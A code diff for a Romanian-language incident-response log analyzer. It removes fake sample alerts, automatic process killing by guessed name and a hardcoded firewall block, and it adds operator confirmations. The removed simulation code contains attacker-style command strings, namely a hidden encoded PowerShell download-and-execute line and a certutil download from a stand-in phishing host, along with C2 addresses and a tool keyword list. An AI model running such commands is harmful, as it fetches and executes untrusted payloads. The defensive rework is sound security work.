@@ -647,92 +647,13 @@ namespace LogAnalyzer.UI.ViewModels
                 TimelineItems.Clear();
                 TimelineItems.AddRange(list);
 
-                if (TimelineItems.Count == 0 && string.IsNullOrWhiteSpace(filteredSearch))
-                {
-                    InitializeDefaultTimeline();
-                }
             }
             catch 
             {
-                if (TimelineItems.Count == 0) InitializeDefaultTimeline();
+                // Nothing loaded: the timeline stays empty (no sample data is ever shown as evidence).
             }
         }
 
-        private void InitializeDefaultTimeline()
-        {
-            if (TimelineItems.Count > 0) return;
-            var baseDate = DateTime.Today.AddHours(9).AddMinutes(15).AddSeconds(32);
-            TimelineItems.Add(new TimelineItem
-            {
-                Timestamp = baseDate,
-                Title = "Proces legitim lansat",
-                Description = "explorer.exe a fost lansat de către utilizator LAB-PC\\Owner",
-                Category = "Proces",
-                Severity = "Informativ",
-                Source = "EDR",
-                UserOrHost = "LAB-PC\\Owner"
-            });
-            TimelineItems.Add(new TimelineItem
-            {
-                Timestamp = baseDate.AddMinutes(2).AddSeconds(42),
-                Title = "Conexiune de rețea outbound",
-                Description = "Cerere DNS inițiată către portalul de actualizări și sincronizare sesiune utilizator.",
-                Category = "Rețea",
-                Severity = "Informativ",
-                Source = "Sysmon Network",
-                UserOrHost = "LAB-PC\\Owner"
-            });
-            TimelineItems.Add(new TimelineItem
-            {
-                Timestamp = baseDate.AddMinutes(5).AddSeconds(33),
-                Title = "Execuție script PowerShell codificat (Base64)",
-                Description = "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA... a fost detectat în linia de comandă.",
-                Category = "Script",
-                Severity = "Avertizare",
-                Source = "PowerShell ScriptBlock (EID 4104)",
-                UserOrHost = "LAB-PC\\Owner"
-            });
-            TimelineItems.Add(new TimelineItem
-            {
-                Timestamp = baseDate.AddMinutes(8).AddSeconds(8),
-                Title = "Tentativă de acces neautorizat la HKLM\\SAM",
-                Description = "Procesul suspect a încercat citirea directă a cheilor de registru pentru credential dumping.",
-                Category = "Registru",
-                Severity = "Avertizare",
-                Source = "EDR Kernel Monitor",
-                UserOrHost = "NT AUTHORITY\\SYSTEM"
-            });
-            TimelineItems.Add(new TimelineItem
-            {
-                Timestamp = baseDate.AddMinutes(9).AddSeconds(40),
-                Title = "Escaladare Privilegii (SeDebugPrivilege / Potato)",
-                Description = "Token de securitate escaladat cu succes la NT AUTHORITY\\SYSTEM prin SeImpersonatePrivilege.",
-                Category = "Privilegii",
-                Severity = "Critic",
-                Source = "Windows Security (EID 4672)",
-                UserOrHost = "NT AUTHORITY\\SYSTEM"
-            });
-            TimelineItems.Add(new TimelineItem
-            {
-                Timestamp = baseDate.AddMinutes(10).AddSeconds(29),
-                Title = "Conexiune C2 stabilită (185.220.101.45:4444)",
-                Description = "Conexiune socket TCP persistentă detectată către adresă IP C2 cunoscută pe portul 4444.",
-                Category = "C2 Beacon",
-                Severity = "Critic",
-                Source = "Windows Firewall EID 5156",
-                UserOrHost = "185.220.101.45:4444"
-            });
-            TimelineItems.Add(new TimelineItem
-            {
-                Timestamp = baseDate.AddMinutes(11).AddSeconds(46),
-                Title = "Încărcare librărie malițioasă rundll32 (%TEMP%\\sk.dll)",
-                Description = "rundll32.exe a executat biblioteca dinamică nesemnată %TEMP%\\sk.dll pentru persistență.",
-                Category = "EDR Shield",
-                Severity = "Critic",
-                Source = "Process Hollowing EID 9999",
-                UserOrHost = "rundll32.exe"
-            });
-        }
 
         private void ReloadDashboardStats()
         {
@@ -767,14 +688,6 @@ namespace LogAnalyzer.UI.ViewModels
             if (int.TryParse(indexStr, out int index))
             {
                 SelectedTabIndex = index;
-                if (index == 4)
-                {
-                    StatusMessage = "STATUS: Conectat la serverul LogAnalyzer | Stream live activ | Evenimente corelate: 7 | Alerte active: 3";
-                }
-                else if (index == 10)
-                {
-                    StatusMessage = $"{DateTime.Now:HH:mm:ss} | STATUS: OPERAȚIONAL | EVENIMENTE PROCESATE: 18,542 | ALERTE ACTIVE: 27 | SESSIUNE: 02:14:37";
-                }
             }
         }
 
@@ -1813,67 +1726,11 @@ namespace LogAnalyzer.UI.ViewModels
                         // Open interactive emergency countermeasure & detail inspection modal for ALL alerts
                         if (alert != null)
                         {
-                            // EMERGENCY AUTOMATIC INITIATIVE (< 10ms): Auto-freeze & Auto-Isolate for Critical attacks
-                            if (alert.Severity == "Critical")
-                            {
-                                string? procToKill = null;
-                                string msgLower = (ev.Message ?? string.Empty).ToLowerInvariant();
-                                if (msgLower.Contains("powershell")) procToKill = "powershell";
-                                else if (msgLower.Contains("certutil")) procToKill = "certutil";
-                                else if (msgLower.Contains("vssadmin")) procToKill = "vssadmin";
-                                else if (msgLower.Contains("curl")) procToKill = "curl";
-                                else if (msgLower.Contains("mshta")) procToKill = "mshta";
-
-                                var autoRes = SystemDefenseExecutionService.ExecuteInstantAutoContainment(procToKill);
-                                IsAutoShieldTriggered = true;
-                                AutoShieldMessage = autoRes.Message;
-                                _auditService.LogAction("AUTO_EMERGENCY_CONTAINMENT", $"{OperatorName} - {autoRes.Message}");
-                            }
-                            else
-                            {
-                                IsAutoShieldTriggered = false;
-                            }
+                            // No automatic action on the station: containment is the operator's decision (tab "Izolare procese suspecte").
+                            IsAutoShieldTriggered = false;
 
                             OpenAlertModal(alert, ev.MachineName);
 
-                            // Persist full Attacker Intelligence Forensic Event into DB and Timeline
-                            var intel = ActiveCountermeasurePlaybook?.AttackerIntel ?? new();
-                            var dossierEvent = new ParsedEvent
-                            {
-                                EventId = 9999,
-                                Level = alert.Severity ?? "Warning",
-                                MachineName = ev.MachineName,
-                                ProviderName = "DFIR-ThreatIntelligence-Attribution",
-                                TimeCreated = DateTime.Now,
-                                Message = $"[DOSAR FORENZIC ATACATOR & ATRIBUIRE CTI]\n" +
-                                          $"• Alertă: {alert.Title}\n" +
-                                          $"• Severitate: {alert.Severity}\n" +
-                                          $"• Actor Cibernetic: {intel.LikelyActorName}\n" +
-                                          $"• C2 / IP / Domeniu: {intel.SourceIpOrDomain}\n" +
-                                          $"• Origine Geografică: {intel.ActorCountryOrOrigin}\n" +
-                                          $"• Motivație: {intel.Motivation}\n" +
-                                          $"• Țintă: {intel.TargetUserOrAccount}\n" +
-                                          $"• Proces Malițios: {intel.AttackProcessPath}\n" +
-                                          $"• Semnătură SHA-256: {intel.AttackHashSha256}\n" +
-                                          $"• Unelte Detectate: {intel.KnownToolsUsed}\n" +
-                                          $"• Recomandare Apărare: {intel.DefenseRecommendation}"
-                            };
-
-                            TotalLiveEventsCaptured++;
-                            LiveStreamingEvents.Insert(0, dossierEvent);
-                            Events.Insert(0, dossierEvent);
-                            TimelineItems.Insert(0, new TimelineItem
-                            {
-                                Timestamp = DateTime.Now,
-                                Source = "DFIR-ThreatIntelligence",
-                                Category = "CTI_ATTACKER_DOSSIER",
-                                Severity = alert.Severity,
-                                MitreTags = alert.MitreTechniqueId,
-                                UserOrHost = intel.TargetUserOrAccount,
-                                Description = $"Dosar identificare atacator: {intel.LikelyActorName} ({intel.SourceIpOrDomain}) | Unelte: {intel.KnownToolsUsed}"
-                            });
-
-                            _auditService.LogAction("THREAT_ACTOR_DOSSIER_STORED", $"{OperatorName} - Atacator: {intel.LikelyActorName}, C2: {intel.SourceIpOrDomain}, Hash: {intel.AttackHashSha256}");
                         }
 
                         try { System.Media.SystemSounds.Exclamation.Play(); } catch {}
@@ -1931,6 +1788,8 @@ namespace LogAnalyzer.UI.ViewModels
         [RelayCommand]
         private void ExecuteIsolateHost()
         {
+            if (MessageBox.Show("Izolați ÎNTREAGA stație de rețea (tot traficul de ieșire blocat)?\n\nPentru un singur program suspect folosiți „Izolare procese suspecte”, care lasă restul PC-ului conectat.",
+                    "Izolare stație", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
             var res = SystemDefenseExecutionService.IsolateHostFromNetwork();
             StatusMessage = $"🛡️ {res.Message}";
             IsCountermeasureModalVisible = false;
@@ -1950,787 +1809,55 @@ namespace LogAnalyzer.UI.ViewModels
             MessageBox.Show(res.Message, "Restaurare Rețea", MessageBoxButton.OK, MessageBoxImage.Information);
         }
 
-        [RelayCommand]
-        private void RemediateServicesAction()
-        {
-            var res = SystemDefenseExecutionService.RemediateServices("PSEXESVC");
-            StatusMessage = $"🧹 {res.Message}";
-            _auditService.LogAction("REMEDIATE_SERVICES", $"{OperatorName} - {res.Message}");
-            MessageBox.Show(res.Message, "Remediere Servicii Malițioase", MessageBoxButton.OK, MessageBoxImage.Information);
-        }
 
-        [RelayCommand]
-        private void RemediateDriversAction()
-        {
-            var res = SystemDefenseExecutionService.RemediateVulnerableDrivers("gdrv");
-            StatusMessage = $"☣️ {res.Message}";
-            _auditService.LogAction("REMEDIATE_DRIVERS", $"{OperatorName} - {res.Message}");
-            MessageBox.Show(res.Message, "Remediere Drivere Kernel BYOVD", MessageBoxButton.OK, MessageBoxImage.Information);
-        }
 
-        [RelayCommand]
-        private void RemediateLsaProtectionAction()
-        {
-            var res = SystemDefenseExecutionService.EnableLsaProtection();
-            StatusMessage = $"🛡️ {res.Message}";
-            _auditService.LogAction("ENABLE_LSA_PPL", $"{OperatorName} - {res.Message}");
-            MessageBox.Show(res.Message, "Activare Protecție LSA (RunAsPPL)", MessageBoxButton.OK, MessageBoxImage.Information);
-        }
 
-        [RelayCommand]
-        private void RemediateHardwareCoolingAction()
-        {
-            var res = SystemDefenseExecutionService.ResetHardwareCoolingPolicy();
-            StatusMessage = $"🔊 {res.Message}";
-            _auditService.LogAction("RESET_HARDWARE_COOLING", $"{OperatorName} - {res.Message}");
-            MessageBox.Show(res.Message, "Resetare Politică Răcire Hardware", MessageBoxButton.OK, MessageBoxImage.Information);
-        }
 
-        [RelayCommand]
-        private void RemediateResetAllRulesAction()
-        {
-            var res = SystemDefenseExecutionService.ResetAllDefenseRules();
-            IsAutoShieldTriggered = false;
-            AutoShieldMessage = string.Empty;
-            StatusMessage = $"♻️ {res.Message}";
-            _auditService.LogAction("RESET_ALL_DEFENSE_RULES", $"{OperatorName} - {res.Message}");
-            MessageBox.Show(res.Message, "Restaurare Totală Sistem Post-Incident", MessageBoxButton.OK, MessageBoxImage.Information);
-        }
 
         [RelayCommand]
         private void ExecuteKillProcess()
         {
-            string? procName = null;
-            int? pid = null;
-            if (ActiveCountermeasureAlert?.RelatedEvents != null && ActiveCountermeasureAlert.RelatedEvents.Count > 0)
-            {
-                var ev = ActiveCountermeasureAlert.RelatedEvents[0];
-                string msg = (ev.Message ?? string.Empty).ToLowerInvariant();
-                if (msg.Contains("powershell")) procName = "powershell";
-                else if (msg.Contains("certutil")) procName = "certutil";
-                else if (msg.Contains("mshta")) procName = "mshta";
-                else if (msg.Contains("curl")) procName = "curl";
-                else if (msg.Contains("vssadmin")) procName = "vssadmin";
-            }
-            if (string.IsNullOrEmpty(procName)) procName = "powershell";
-
-            var res = SystemDefenseExecutionService.TerminateProcessTree(procName, pid);
-            StatusMessage = $"🛑 {res.Message}";
+            // Killing every process with a guessed name (the former behaviour) is not acceptable on evidence.
+            // The suspicious program is contained individually, scanned and documented in the containment tab.
             IsCountermeasureModalVisible = false;
-            _auditService.LogAction("TERMINATE_PROCESS_TREE", $"{OperatorName} - Proces: {procName}, Rezultat: {res.Message}");
-            MessageBox.Show(res.Message, "Neutralizare Proces Malițios", MessageBoxButton.OK, MessageBoxImage.Information);
+            SelectedTabIndex = 13;
+            StatusMessage = "Selectați programul în „Izolare procese suspecte”: i se blochează doar lui rețeaua, este scanat, iar incidentul se salvează cu probe.";
         }
 
         [RelayCommand]
         private void ExecuteBlockIoC()
         {
-            string target = "185.220.101.5";
-            var res = SystemDefenseExecutionService.BlockMaliciousIoC(target);
-            StatusMessage = $"🚫 {res.Message}";
+            // Only addresses that appear in the alert itself, never a fixed address; the operator confirms.
+            var text = string.Join(" ", new[] { ActiveCountermeasureAlert?.Explanation ?? "" }
+                .Concat(ActiveCountermeasureAlert?.RelatedEvents?.Select(e => e.Message ?? "") ?? Enumerable.Empty<string>()));
+            var ips = Regex.Matches(text, @"\b(?:\d{1,3}\.){3}\d{1,3}\b").Select(m => m.Value).Distinct()
+                .Where(ip => LogAnalyzer.Dfir.Analysis.IpClassifier.IsExternal(ip)).ToList();
             IsCountermeasureModalVisible = false;
-            _auditService.LogAction("BLOCK_IOC_FIREWALL", $"{OperatorName} - Tinta: {target}, Rezultat: {res.Message}");
-            MessageBox.Show(res.Message, "Combatere Phishing & C2", MessageBoxButton.OK, MessageBoxImage.Information);
-        }
-
-        [RelayCommand]
-        private void SimulateLiveAlert()
-        {
-            var simEvent = new ParsedEvent
+            if (ips.Count == 0)
             {
-                EventId = 4104,
-                Level = "Warning",
-                MachineName = Environment.MachineName,
-                ProviderName = "Microsoft-Windows-PowerShell",
-                TimeCreated = DateTime.Now,
-                Message = "Creating Scriptblock text: powershell.exe -enc VwByAGkAdABlAC0ASABvAHMAdAAgACIAVABlAHMAdAAiAA== -nop -w hidden # downloadstring iex"
-            };
-
-            TotalLiveEventsCaptured++;
-            LiveStreamingEvents.Insert(0, simEvent);
-            var alert = _liveEngine.EvaluateLiveEvent(simEvent);
-            if (alert != null)
+                MessageBox.Show("Alerta nu conține nicio adresă IP publică de blocat.", "Blocare IoC", MessageBoxButton.OK, MessageBoxImage.Information);
+                return;
+            }
+            if (MessageBox.Show($"Blocați în Windows Firewall traficul de ieșire către:\n\n{string.Join("\n", ips)}\n\nAdresele provin din textul alertei. Regula se poate șterge din „Restaurare rețea”.",
+                    "Blocare IoC", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
+            foreach (var ip in ips)
             {
-                LiveAlerts.Insert(0, alert);
-                IsAutoShieldTriggered = true;
-                AutoShieldMessage = "Procesul suspect a fost neutralizat instant și conexiunea izolată preventiv!";
-                ActiveCountermeasureAlert = alert;
-                ActiveCountermeasurePlaybook = _countermeasureEngine.GeneratePlaybook(alert, Environment.MachineName);
-                IsCountermeasureModalVisible = true;
-                StatusMessage = $"🚨 SIMULARE ALERTĂ: {alert.Title}";
-
-                var intel = ActiveCountermeasurePlaybook.AttackerIntel;
-                var dossierEvent = new ParsedEvent
-                {
-                    EventId = 9999,
-                    Level = "Critical",
-                    MachineName = Environment.MachineName,
-                    ProviderName = "DFIR-ThreatIntelligence-Attribution",
-                    TimeCreated = DateTime.Now,
-                    Message = $"[DOSAR FORENZIC ATACATOR & ATRIBUIRE CTI]\n" +
-                              $"• Actor Cibernetic: {intel.LikelyActorName}\n" +
-                              $"• C2 / IP / Domeniu: {intel.SourceIpOrDomain}\n" +
-                              $"• Origine Geografică: {intel.ActorCountryOrOrigin}\n" +
-                              $"• Motivație: {intel.Motivation}\n" +
-                              $"• Țintă: {intel.TargetUserOrAccount}\n" +
-                              $"• Proces Malițios: {intel.AttackProcessPath}\n" +
-                              $"• Semnătură SHA-256: {intel.AttackHashSha256}\n" +
-                              $"• Unelte Detectate: {intel.KnownToolsUsed}\n" +
-                              $"• Recomandare Apărare: {intel.DefenseRecommendation}"
-                };
-
-                TotalLiveEventsCaptured++;
-                LiveStreamingEvents.Insert(0, dossierEvent);
-                Events.Insert(0, dossierEvent);
-                TimelineItems.Insert(0, new TimelineItem
-                {
-                    Timestamp = DateTime.Now,
-                    Source = "DFIR-ThreatIntelligence",
-                    Category = "CTI_ATTACKER_DOSSIER",
-                    Severity = "Critical",
-                    MitreTags = alert.MitreTechniqueId,
-                    UserOrHost = intel.TargetUserOrAccount,
-                    Description = $"Dosar identificare atacator: {intel.LikelyActorName} ({intel.SourceIpOrDomain}) | Unelte: {intel.KnownToolsUsed}"
-                });
-
-                _auditService.LogAction("THREAT_ACTOR_DOSSIER_STORED", $"{OperatorName} - Atacator: {intel.LikelyActorName}, C2: {intel.SourceIpOrDomain}, Hash: {intel.AttackHashSha256}");
-
-                try { System.Media.SystemSounds.Exclamation.Play(); } catch {}
-
-                _toastAutoDismissTimer?.Stop();
-                _toastAutoDismissTimer = new System.Timers.Timer(7000);
-                _toastAutoDismissTimer.AutoReset = false;
-                _toastAutoDismissTimer.Elapsed += (s, e) =>
-                {
-                    Application.Current?.Dispatcher?.Invoke(() => IsLiveToastVisible = false);
-                };
-                _toastAutoDismissTimer.Start();
+                var res = SystemDefenseExecutionService.BlockMaliciousIoC(ip);
+                _auditService.LogAction("BLOCK_IOC_FIREWALL", $"{OperatorName} - Tinta: {ip}, Rezultat: {res.Message}");
+                StatusMessage = res.Message;
             }
         }
 
-        [RelayCommand]
-        private void SimulatePhishingAttack()
-        {
-            var simEvent = new ParsedEvent
-            {
-                EventId = 4104,
-                Level = "Warning",
-                MachineName = Environment.MachineName,
-                ProviderName = "Microsoft-Windows-PowerShell",
-                TimeCreated = DateTime.Now,
-                Message = "Creating Scriptblock text: certutil.exe -urlcache -split -f http://evil-phishing-portal.com/login_invoice.iso C:\\Users\\Public\\login_invoice.iso; # tentativa phishing"
-            };
 
-            TotalLiveEventsCaptured++;
-            LiveStreamingEvents.Insert(0, simEvent);
-            var alert = _liveEngine.EvaluateLiveEvent(simEvent);
-            if (alert != null)
-            {
-                LiveAlerts.Insert(0, alert);
-                CurrentLiveToastAlert = alert;
-                IsLiveToastVisible = true;
-                IsAutoShieldTriggered = true;
-                AutoShieldMessage = "Procesul de descărcare payload a fost neutralizat instant și conexiunea izolată preventiv!";
-                ActiveCountermeasureAlert = alert;
-                ActiveCountermeasurePlaybook = _countermeasureEngine.GeneratePlaybook(alert, Environment.MachineName);
-                IsCountermeasureModalVisible = true;
-                StatusMessage = $"🎣 PHISHING DETECTAT: {alert.Title}";
 
-                var intel = ActiveCountermeasurePlaybook.AttackerIntel;
-                var dossierEvent = new ParsedEvent
-                {
-                    EventId = 9999,
-                    Level = "Critical",
-                    MachineName = Environment.MachineName,
-                    ProviderName = "DFIR-ThreatIntelligence-Attribution",
-                    TimeCreated = DateTime.Now,
-                    Message = $"[DOSAR FORENZIC ATACATOR & ATRIBUIRE CTI]\n" +
-                              $"• Actor Cibernetic: {intel.LikelyActorName}\n" +
-                              $"• C2 / IP / Domeniu: {intel.SourceIpOrDomain}\n" +
-                              $"• Origine Geografică: {intel.ActorCountryOrOrigin}\n" +
-                              $"• Motivație: {intel.Motivation}\n" +
-                              $"• Țintă: {intel.TargetUserOrAccount}\n" +
-                              $"• Proces Malițios: {intel.AttackProcessPath}\n" +
-                              $"• Semnătură SHA-256: {intel.AttackHashSha256}\n" +
-                              $"• Unelte Detectate: {intel.KnownToolsUsed}\n" +
-                              $"• Recomandare Apărare: {intel.DefenseRecommendation}"
-                };
 
-                TotalLiveEventsCaptured++;
-                LiveStreamingEvents.Insert(0, dossierEvent);
-                Events.Insert(0, dossierEvent);
-                TimelineItems.Insert(0, new TimelineItem
-                {
-                    Timestamp = DateTime.Now,
-                    Source = "DFIR-ThreatIntelligence",
-                    Category = "CTI_ATTACKER_DOSSIER",
-                    Severity = "Critical",
-                    MitreTags = alert.MitreTechniqueId,
-                    UserOrHost = intel.TargetUserOrAccount,
-                    Description = $"Dosar identificare atacator: {intel.LikelyActorName} ({intel.SourceIpOrDomain}) | Unelte: {intel.KnownToolsUsed}"
-                });
 
-                _auditService.LogAction("THREAT_ACTOR_DOSSIER_STORED", $"{OperatorName} - Atacator: {intel.LikelyActorName}, C2: {intel.SourceIpOrDomain}, Hash: {intel.AttackHashSha256}");
 
-                try { System.Media.SystemSounds.Exclamation.Play(); } catch {}
-            }
-        }
 
-        [RelayCommand]
-        private void SimulateLateralMovementAttack()
-        {
-            var simEvent = new ParsedEvent
-            {
-                EventId = 7045,
-                Level = "Critical",
-                MachineName = Environment.MachineName,
-                ProviderName = "Service Control Manager",
-                TimeCreated = DateTime.Now,
-                Message = "A service was installed in the system.\nService Name: PSEXESVC\nService File Name: %SystemRoot%\\PSEXESVC.exe\nService Type: user mode service\nService Account: NT AUTHORITY\\SYSTEM\nClient Process Id: 4328\nSource Network Address: 192.168.1.145 (Pivot Compromised Host)"
-            };
 
-            TotalLiveEventsCaptured++;
-            LiveStreamingEvents.Insert(0, simEvent);
-            Events.Insert(0, simEvent);
 
-            var alert = new DetectedIssue
-            {
-                Title = "ALERTĂ CRITICĂ: Mișcare Laterală & Instalare Serviciu de la Distanță (PsExec / SMB)",
-                Severity = "Critical",
-                Explanation = "Atacatorul a pătruns deja pe un alt nod din rețea (192.168.1.145) și încearcă propagarea laterală pe această stație prin crearea de la distanță a serviciului PSEXESVC.exe cu privilegii SYSTEM.",
-                MitreTechniqueId = "T1021.002 (SMB/Windows Admin Shares) & T1543.003 (Windows Service)",
-                RelatedEvents = new List<ParsedEvent> { simEvent }
-            };
 
-            LiveAlerts.Insert(0, alert);
-            IsAutoShieldTriggered = true;
-            AutoShieldMessage = "⚡ SCUT AUTOMAT EDR: Conexiunea cu stația compromisă 192.168.1.145 a fost blocată pe firewall!";
-            
-            OpenAlertModal(alert, Environment.MachineName);
-            StatusMessage = $"🚨 ATAC DETECTAT: {alert.Title}";
 
-            var intel = ActiveCountermeasurePlaybook?.AttackerIntel ?? new();
-            var dossierEvent = new ParsedEvent
-            {
-                EventId = 9999,
-                Level = "Critical",
-                MachineName = Environment.MachineName,
-                ProviderName = "DFIR-ThreatIntelligence-Attribution",
-                TimeCreated = DateTime.Now,
-                Message = $"[DOSAR FORENZIC ATACATOR & DEPLASARE LATERALĂ]\n" +
-                          $"• Fază Kill Chain: Lateral Movement & Privilege Escalation (Post-Breach)\n" +
-                          $"• Nod Compromis Sursă: 192.168.1.145 (Pivot Intern)\n" +
-                          $"• Metodă Execuție: PsExec Service / SMB Admin Share (C$ / IPC$)\n" +
-                          $"• Cont Compromis: NT AUTHORITY\\SYSTEM / DOMAIN\\Administrator\n" +
-                          $"• Proces Malițios: %SystemRoot%\\PSEXESVC.exe\n" +
-                          $"• Recomandare Apărare: Izolare imediată a stației sursă 192.168.1.145 și resetare bilete Kerberos TGT."
-            };
-
-            TotalLiveEventsCaptured++;
-            LiveStreamingEvents.Insert(0, dossierEvent);
-            Events.Insert(0, dossierEvent);
-            TimelineItems.Insert(0, new TimelineItem
-            {
-                Timestamp = DateTime.Now,
-                Source = "DFIR-ThreatIntelligence",
-                Category = "CTI_LATERAL_MOVEMENT",
-                Severity = "Critical",
-                MitreTags = "T1021.002 / T1543.003",
-                UserOrHost = "192.168.1.145 -> " + Environment.MachineName,
-                Description = "Detectat atacator deja pătruns în rețea realizând mișcare laterală via PsExec Service"
-            });
-
-            _auditService.LogAction("LATERAL_MOVEMENT_BLOCKED", $"{OperatorName} - Atacator pivot: 192.168.1.145, Metodă: PSEXESVC");
-            try { System.Media.SystemSounds.Exclamation.Play(); } catch {}
-        }
-
-        [RelayCommand]
-        private void SimulateByovdAttack()
-        {
-            var simEvent = new ParsedEvent
-            {
-                EventId = 7045,
-                Level = "Critical",
-                MachineName = Environment.MachineName,
-                ProviderName = "Service Control Manager",
-                TimeCreated = DateTime.Now,
-                Message = "A service was installed in the system.\nService Name: gdrv\nService File Name: C:\\Windows\\Temp\\gdrv.sys (Known Vulnerable GIGABYTE Driver / BYOVD)\nService Type: kernel driver\nService Start Type: demand start\nService Account: \nThreat Intel: LOLDrivers Vulnerability CVE-2018-19320 (Arbitrary Ring 0 Kernel Memory Read/Write)"
-            };
-
-            TotalLiveEventsCaptured++;
-            LiveStreamingEvents.Insert(0, simEvent);
-            Events.Insert(0, simEvent);
-
-            var alert = _liveEngine.EvaluateLiveEvent(simEvent);
-            if (alert != null)
-            {
-                LiveAlerts.Insert(0, alert);
-                IsAutoShieldTriggered = true;
-                AutoShieldMessage = "⚡ SCUT AUTOMAT EDR: Driverul kernel vulnerabil gdrv.sys a fost blocat și serviciul oprit instant!";
-
-                OpenAlertModal(alert, Environment.MachineName);
-                StatusMessage = $"🚨 EXPLOIT KERNEL DETECTAT: {alert.Title}";
-
-                var intel = ActiveCountermeasurePlaybook?.AttackerIntel ?? new();
-                var dossierEvent = new ParsedEvent
-                {
-                    EventId = 9999,
-                    Level = "Critical",
-                    MachineName = Environment.MachineName,
-                    ProviderName = "DFIR-ThreatIntelligence-Attribution",
-                    TimeCreated = DateTime.Now,
-                    Message = $"[DOSAR FORENZIC ATACATOR & EXPLOIT KERNEL BYOVD]\n" +
-                              $"• Tip Amenințare: Bring Your Own Vulnerable Driver (Ring 0 Defense Evasion)\n" +
-                              $"• Binar Vulnerabil: C:\\Windows\\Temp\\gdrv.sys (LOLDrivers Match)\n" +
-                              $"• CVE Asociat: CVE-2018-19320 (Kernel Privilege Escalation)\n" +
-                              $"• Țintă Atacator: Dezactivare EDR Hooks & Blind Security Sensors\n" +
-                              $"• Recomandare Apărare: Oprire serviciu 'sc.exe stop gdrv', ștergere binar .sys și activare Memory Integrity (HVCI)."
-                };
-
-                TotalLiveEventsCaptured++;
-                LiveStreamingEvents.Insert(0, dossierEvent);
-                Events.Insert(0, dossierEvent);
-                TimelineItems.Insert(0, new TimelineItem
-                {
-                    Timestamp = DateTime.Now,
-                    Source = "DFIR-ThreatIntelligence",
-                    Category = "CTI_KERNEL_BYOVD",
-                    Severity = "Critical",
-                    MitreTags = "T1068 / T1543.003",
-                    UserOrHost = Environment.MachineName,
-                    Description = "Detectat atac BYOVD de eludare a securității prin încărcarea driverului kernel gdrv.sys"
-                });
-
-                _auditService.LogAction("BYOVD_EXPLOIT_BLOCKED", $"{OperatorName} - Driver vulnerabil: gdrv.sys, CVE-2018-19320");
-                try { System.Media.SystemSounds.Exclamation.Play(); } catch {}
-            }
-        }
-
-        [RelayCommand]
-        private void SimulateProcessHollowingAttack()
-        {
-            var simEvent = new ParsedEvent
-            {
-                EventId = 10,
-                Level = "Critical",
-                MachineName = Environment.MachineName,
-                ProviderName = "Microsoft-Windows-Sysmon",
-                TimeCreated = DateTime.Now,
-                Message = "Process Injection / Memory Anomaly detected.\nSource Process: powershell.exe (PID 6120)\nTarget Process: C:\\Windows\\System32\\notepad.exe (PID 8412 - Injected)\nCall Trace: VirtualAllocEx(PAGE_EXECUTE_READWRITE) -> WriteProcessMemory -> CreateRemoteThread\nNetwork Beacon: notepad.exe (PID 8412) attempting outbound socket to 91.240.118.15:443 (Cobalt Strike C2)"
-            };
-
-            TotalLiveEventsCaptured++;
-            LiveStreamingEvents.Insert(0, simEvent);
-            Events.Insert(0, simEvent);
-
-            var alert = _liveEngine.EvaluateLiveEvent(simEvent);
-            if (alert != null)
-            {
-                LiveAlerts.Insert(0, alert);
-                IsAutoShieldTriggered = true;
-                AutoShieldMessage = "⚡ SCUT AUTOMAT EDR: Procesul hollowed notepad.exe (PID 8412) a fost neutralizat instant și conexiunea C2 izolată!";
-
-                OpenAlertModal(alert, Environment.MachineName);
-                StatusMessage = $"🚨 INJECȚIE MEMORIE DETECTATĂ: {alert.Title}";
-
-                var intel = ActiveCountermeasurePlaybook?.AttackerIntel ?? new();
-                var dossierEvent = new ParsedEvent
-                {
-                    EventId = 9999,
-                    Level = "Critical",
-                    MachineName = Environment.MachineName,
-                    ProviderName = "DFIR-ThreatIntelligence-Attribution",
-                    TimeCreated = DateTime.Now,
-                    Message = $"[DOSAR FORENZIC ATACATOR & INJECȚIE MEMORIE HOLLOWING]\n" +
-                              $"• Tehnică Atac: Process Hollowing & Remote Thread Injection (T1055.012)\n" +
-                              $"• Proces Gazdă Compromis în RAM: notepad.exe (PID 8412)\n" +
-                              $"• Sursă Injecție: powershell.exe (PID 6120)\n" +
-                              $"• Server C2 Contactat: 91.240.118.15:443 (Cobalt Strike Beacon)\n" +
-                              $"• Recomandare Apărare: Termină forțat arborele de procese și blochează IP-ul 91.240.118.15 pe firewall."
-                };
-
-                TotalLiveEventsCaptured++;
-                LiveStreamingEvents.Insert(0, dossierEvent);
-                Events.Insert(0, dossierEvent);
-                TimelineItems.Insert(0, new TimelineItem
-                {
-                    Timestamp = DateTime.Now,
-                    Source = "DFIR-ThreatIntelligence",
-                    Category = "CTI_PROCESS_HOLLOWING",
-                    Severity = "Critical",
-                    MitreTags = "T1055.012",
-                    UserOrHost = Environment.MachineName,
-                    Description = "Injecție exclusivă în memorie (Process Hollowing) neutralizată pe procesul notepad.exe (PID 8412)"
-                });
-
-                _auditService.LogAction("PROCESS_HOLLOWING_BLOCKED", $"{OperatorName} - Target: notepad.exe PID 8412, C2: 91.240.118.15");
-                try { System.Media.SystemSounds.Exclamation.Play(); } catch {}
-            }
-        }
-
-        [RelayCommand]
-        private void SimulateBadUsbAttack()
-        {
-            var simEvent = new ParsedEvent
-            {
-                EventId = 2003,
-                Level = "Critical",
-                MachineName = Environment.MachineName,
-                ProviderName = "Microsoft-Windows-DriverFrameworks-UserMode",
-                TimeCreated = DateTime.Now,
-                Message = "Unauthorized USB HID Device detected (BadUSB / Rubber Ducky).\nDevice Instance: USB\\VID_16C0&PID_0486\\HID_KEYBOARD_INJECTOR\nTelemetry: High-speed automated keystroke burst (>1200 CPM) spawning hidden powershell.exe"
-            };
-
-            TotalLiveEventsCaptured++;
-            LiveStreamingEvents.Insert(0, simEvent);
-            Events.Insert(0, simEvent);
-
-            var alert = _liveEngine.EvaluateLiveEvent(simEvent);
-            if (alert != null)
-            {
-                LiveAlerts.Insert(0, alert);
-                IsAutoShieldTriggered = true;
-                AutoShieldMessage = "⚡ SCUT AUTOMAT EDR: Portul USB malițios a fost blocat și procesul de shell neutralizat!";
-
-                OpenAlertModal(alert, Environment.MachineName);
-                StatusMessage = $"🚨 ATAC FIZIC DETECTAT: {alert.Title}";
-
-                var intel = ActiveCountermeasurePlaybook?.AttackerIntel ?? new();
-                var dossierEvent = new ParsedEvent
-                {
-                    EventId = 9999,
-                    Level = "Critical",
-                    MachineName = Environment.MachineName,
-                    ProviderName = "DFIR-ThreatIntelligence-Attribution",
-                    TimeCreated = DateTime.Now,
